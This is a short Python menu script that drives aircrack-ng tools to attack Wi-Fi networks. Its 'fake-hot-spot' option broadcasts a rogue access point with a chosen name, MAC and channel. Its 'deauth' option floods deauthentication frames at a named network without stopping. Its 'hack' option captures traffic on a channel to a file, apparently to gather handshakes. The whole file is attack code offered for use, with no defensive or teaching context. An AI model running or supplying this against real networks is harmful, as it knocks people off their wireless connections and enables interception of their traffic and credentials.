from subprocess import call

try:
    answ = input("-> ")
    if answ == "fake-hot-spot":
        name = input("Enter name of fake wifi hot spot: ")
        mac = input("Enter mac address of fake wifi hot spot: ")
        ch = input("Enter channel number of fake wifi hot spot: ")
        call(["iwconfig"])
        adapter = input("Enter name of your network adapter: ")
        call(["airmon-ng", "start", adapter])
        adapter = adapter + "mon"
        call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])

    if answ == "deauth":
        call(["airmon-ng"])
        adapter = input("Enter name of your network adapter: ")
        call(["airmon-ng", "start", adapter])
        adapter = adapter + "mon"
        name = input("Enter deauth essid: ")
        call(["aireplay-ng", "-0", "0", "-e", name, adapter])

    if answ == "hack":
        call(["airmon-ng"])
        adapter = input("Enter name of your network adapter: ")
        call(["airmon-ng", "start", adapter])
        ch = input("Enter channel: ")
        adapter = adapter + "mon"
        call(["airodump-ng", adapter, "--channel", ch, "-w", "cap2"])
except KeyboardInterrupt:
    call(["airmon-ng", "stop", adapter])
    print("Bye")
